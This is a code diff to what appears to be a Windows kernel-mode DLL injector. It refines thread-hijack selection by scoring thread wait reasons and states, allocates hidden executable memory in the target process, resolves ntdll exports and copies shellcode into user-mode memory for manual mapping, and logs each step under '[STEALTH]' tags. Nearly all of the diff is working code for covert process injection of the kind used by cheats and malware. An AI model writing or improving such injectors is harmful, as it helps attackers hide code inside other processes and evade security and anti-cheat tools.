@@ -75,7 +75,7 @@ NTSTATUS AllocateHiddenMemory(
 
 //
 // Find a thread suitable for hijacking
-// We look for threads that are in a wait state (alertable preferred)
+// Avoids: Loader lock holders, critical section waiters, kernel waiters
 //
 NTSTATUS FindHijackableThread(
     _In_ PEPROCESS Process,
@@ -124,45 +124,107 @@ NTSTATUS FindHijackableThread(
                     reinterpret_cast<PUCHAR>(processInfo) + sizeof(SYSTEM_PROCESS_INFORMATION));
 
                 PETHREAD bestThread = nullptr;
-                ULONG bestScore = 0;
+                LONG bestScore = -1000; // Allow negative scores to filter bad threads
 
                 for (ULONG i = 0; i < processInfo->NumberOfThreads; i++)
                 {
                     HANDLE threadId = threadInfo[i].ClientId.UniqueThread;
-                    ULONG score = 0;
+                    LONG score = 0;
 
+                    // === SKIP CRITERIA (hard exclusions) ===
+                    
                     // Skip system threads (TID 0, 4, etc.)
                     if (HandleToULong(threadId) <= 4)
                     {
                         continue;
                     }
 
-                    // Prefer threads in Wait state
+                    // Skip terminated/terminating threads
+                    if (threadInfo[i].ThreadState == 4 || // Terminated
+                        threadInfo[i].ThreadState == 6)   // Transition (being swapped)
+                    {
+                        continue;
+                    }
+
+                    // === DANGEROUS WAIT REASONS (avoid - may hold locks) ===
+                    
+                    // WrLpcReceive - thread is waiting for LPC, likely in critical code
+                    if (threadInfo[i].WaitReason == WrLpcReceive ||
+                        threadInfo[i].WaitReason == WrLpcReply)
+                    {
+                        score -= 200;
+                    }
+                    
+                    // Kernel resource waits - thread may hold kernel locks
+                    if (threadInfo[i].WaitReason == WrExecutive ||
+                        threadInfo[i].WaitReason == WrFreePage ||
+                        threadInfo[i].WaitReason == WrPageIn ||
+                        threadInfo[i].WaitReason == WrPoolAllocation ||
+                        threadInfo[i].WaitReason == WrResource ||
+                        threadInfo[i].WaitReason == WrPushLock ||
+                        threadInfo[i].WaitReason == WrMutex)
+                    {
+                        continue; // Hard skip - kernel locks
+                    }
+                    
+                    // WrGuardedMutex - likely holding a guarded mutex
+                    if (threadInfo[i].WaitReason == WrGuardedMutex)
+                    {
+                        continue;
+                    }
+
+                    // === GOOD WAIT REASONS (prefer) ===
+                    
+                    // Waiting state with safe wait reasons
                     if (threadInfo[i].ThreadState == 5) // Waiting
                     {
                         score += 100;
 
-                        // Extra points for alertable wait
-                        if (threadInfo[i].WaitReason == WrUserRequest || 
-                            threadInfo[i].WaitReason == WrEventPair ||
-                            threadInfo[i].WaitReason == WrQueue)
+                        // Best: Thread is waiting for user input or similar passive wait
+                        if (threadInfo[i].WaitReason == WrUserRequest)
                         {
-                            score += 50;
+                            score += 100; // Excellent - GUI thread waiting for input
+                        }
+                        else if (threadInfo[i].WaitReason == WrQueue)
+                        {
+                            score += 80; // Worker thread waiting for work
+                        }
+                        else if (threadInfo[i].WaitReason == WrDelayExecution)
+                        {
+                            score += 70; // Thread is sleeping - safe
+                        }
+                        else if (threadInfo[i].WaitReason == WrEventPair ||
+                                 threadInfo[i].WaitReason == WrSuspended)
+                        {
+                            score += 60; // Event wait - usually safe
                         }
                     }
-                    // Running threads are okay too
+                    // Running threads - riskier but workable
                     else if (threadInfo[i].ThreadState == 2) // Running
                     {
                         score += 25;
                     }
-
-                    // Skip if thread is in kernel mode for critical operations
-                    if (threadInfo[i].WaitReason == WrExecutive ||
-                        threadInfo[i].WaitReason == WrFreePage ||
-                        threadInfo[i].WaitReason == WrPageIn ||
-                        threadInfo[i].WaitReason == WrPoolAllocation)
+                    // Ready threads - about to run
+                    else if (threadInfo[i].ThreadState == 1) // Ready
                     {
-                        continue;
+                        score += 30;
+                    }
+                    // Standby - next to run on processor
+                    else if (threadInfo[i].ThreadState == 3) // Standby
+                    {
+                        score += 20;
+                    }
+
+                    // === THREAD CHARACTERISTICS ===
+                    
+                    // Prefer threads with higher priority (likely main/render threads)
+                    if (threadInfo[i].Priority >= 8 && threadInfo[i].Priority <= 10)
+                    {
+                        score += 15; // Normal priority range
+                    }
+                    else if (threadInfo[i].Priority > 10)
+                    {
+                        score += 25; // Above normal - likely important but not system
                     }
 
                     if (score > bestScore)
@@ -173,22 +235,47 @@ NTSTATUS FindHijackableThread(
 
                         if (NT_SUCCESS(status))
                         {
-                            // Release previous best
-                            if (bestThread)
+                            // Additional runtime checks on the thread object
+                            BOOLEAN isSystemThread = PsIsSystemThread(thread);
+                            BOOLEAN isTerminating = PsIsThreadTerminating(thread);
+                            
+                            if (!isSystemThread && !isTerminating)
                             {
-                                ObDereferenceObject(bestThread);
-                            }
+                                // Release previous best
+                                if (bestThread)
+                                {
+                                    ObDereferenceObject(bestThread);
+                                }
 
-                            bestThread = thread;
-                            bestScore = score;
+                                bestThread = thread;
+                                bestScore = score;
+                                
+                                WPP_PRINT(TRACE_LEVEL_VERBOSE, GENERAL,
+                                    "[STEALTH] Thread TID %d score %d (state=%d, wait=%d, pri=%d)",
+                                    HandleToULong(threadId), score, 
+                                    threadInfo[i].ThreadState, threadInfo[i].WaitReason,
+                                    threadInfo[i].Priority);
+                            }
+                            else
+                            {
+                                ObDereferenceObject(thread);
+                            }
                         }
                     }
                 }
 
-                if (bestThread)
+                if (bestThread && bestScore > 0)
                 {
                     *Thread = bestThread;
+                    WPP_PRINT(TRACE_LEVEL_INFORMATION, GENERAL,
+                        "[STEALTH] Selected thread TID %d with score %d",
+                        HandleToULong(PsGetThreadId(bestThread)), bestScore);
                     return STATUS_SUCCESS;
+                }
+                
+                if (bestThread)
+                {
+                    ObDereferenceObject(bestThread);
                 }
             }
             break;
@@ -434,6 +521,13 @@ INJECT_STATUS InjectDll(
         return INJECT_STATUS::ModuleNotFound;
     }
 
+    PLDR_DATA_TABLE_ENTRY ntdllEntry = Misc::Module::GetModuleByName(L"ntdll.dll");
+    if (!ntdllEntry)
+    {
+        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to locate ntdll.dll!");
+        return INJECT_STATUS::ModuleNotFound;
+    }
+
     // Allocate hidden memory for the DLL image
     status = AllocateHiddenMemory(ZwCurrentProcess(), &allocatedImageBase, &allocatedImageRegionSize,
                                    PAGE_EXECUTE_READWRITE);
@@ -485,6 +579,13 @@ INJECT_STATUS InjectDll(
     // === Get required exports ===
     PVOID LoadLibraryA = Misc::PE::GetProcAddress(kernel32Entry->DllBase, "LoadLibraryA");
     PVOID GetProcAddress = Misc::PE::GetProcAddress(kernel32Entry->DllBase, "GetProcAddress");
+    PVOID NtFlushInstructionCache = Misc::PE::GetProcAddress(ntdllEntry->DllBase, "NtFlushInstructionCache");
+    
+    // Optional TLS support
+    PVOID LdrpHandleTlsData = Misc::PE::GetProcAddress(ntdllEntry->DllBase, "LdrpHandleTlsData");
+    
+    // Optional VEH support
+    PVOID RtlAddVectoredExceptionHandler = Misc::PE::GetProcAddress(ntdllEntry->DllBase, "RtlAddVectoredExceptionHandler");
 
     if (!LoadLibraryA || !GetProcAddress)
     {
@@ -512,21 +613,46 @@ INJECT_STATUS InjectDll(
     hijackContext->ImportDirRva = importDir.VirtualAddress;
     hijackContext->ImportDirSize = importDir.Size;
 
-    // Function pointers
+    // TLS info
+    auto& tlsDir = nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+    hijackContext->TlsDirRva = tlsDir.VirtualAddress;
+    hijackContext->TlsDirSize = tlsDir.Size;
+
+    // Function pointers (required)
     hijackContext->pLoadLibraryA = reinterpret_cast<ULONG64>(LoadLibraryA);
     hijackContext->pGetProcAddress = reinterpret_cast<ULONG64>(GetProcAddress);
-    hijackContext->pNtFlushInstructionCache = 0; // Optional, shellcode doesn't use it
+    hijackContext->pNtFlushInstructionCache = reinterpret_cast<ULONG64>(NtFlushInstructionCache);
+    
+    // Function pointers (optional)
+    hijackContext->pLdrpHandleTlsData = reinterpret_cast<ULONG64>(LdrpHandleTlsData);
+    hijackContext->pRtlAddVectoredExceptionHandler = reinterpret_cast<ULONG64>(RtlAddVectoredExceptionHandler);
 
-    // === Copy shellcode ===
-    RtlCopyMemory(shellcodeBase, StealthShellcode::g_HijackShellcode, StealthShellcode::HIJACK_SHELLCODE_SIZE);
+    // === Copy shellcode from kernel to usermode hidden memory ===
+    SIZE_T shellcodeSize = StealthShellcode::GetShellcodeSize();
+    if (shellcodeSize > shellcodeRegionSize)
+    {
+        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Shellcode too large: %llu > %llu", 
+                  shellcodeSize, shellcodeRegionSize);
+        return INJECT_STATUS::InternalError;
+    }
+    
+    status = StealthShellcode::CopyShellcodeToUsermode(shellcodeBase, shellcodeRegionSize);
+    if (!NT_SUCCESS(status))
+    {
+        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to copy shellcode: %!STATUS!", status);
+        return INJECT_STATUS::InternalError;
+    }
 
     WPP_PRINT(TRACE_LEVEL_VERBOSE, GENERAL,
-              "[STEALTH] Image at 0x%p (0x%llX bytes), Context at 0x%p, Shellcode at 0x%p",
-              allocatedImageBase, imageSize, contextBase, shellcodeBase);
+              "[STEALTH] Image at 0x%p (0x%llX bytes), Context at 0x%p, Shellcode at 0x%p (%llu bytes)",
+              allocatedImageBase, imageSize, contextBase, shellcodeBase, shellcodeSize);
     WPP_PRINT(TRACE_LEVEL_VERBOSE, GENERAL,
               "[STEALTH] EntryPoint RVA: 0x%llX, Reloc RVA: 0x%llX (0x%llX), Import RVA: 0x%llX (0x%llX)",
               hijackContext->EntryPointRva, hijackContext->RelocDirRva, hijackContext->RelocDirSize,
               hijackContext->ImportDirRva, hijackContext->ImportDirSize);
+    WPP_PRINT(TRACE_LEVEL_VERBOSE, GENERAL,
+              "[STEALTH] TLS RVA: 0x%llX (0x%llX), LdrpHandleTlsData: 0x%p",
+              hijackContext->TlsDirRva, hijackContext->TlsDirSize, LdrpHandleTlsData);
 
     if (Config->UseThreadHijack)
     {
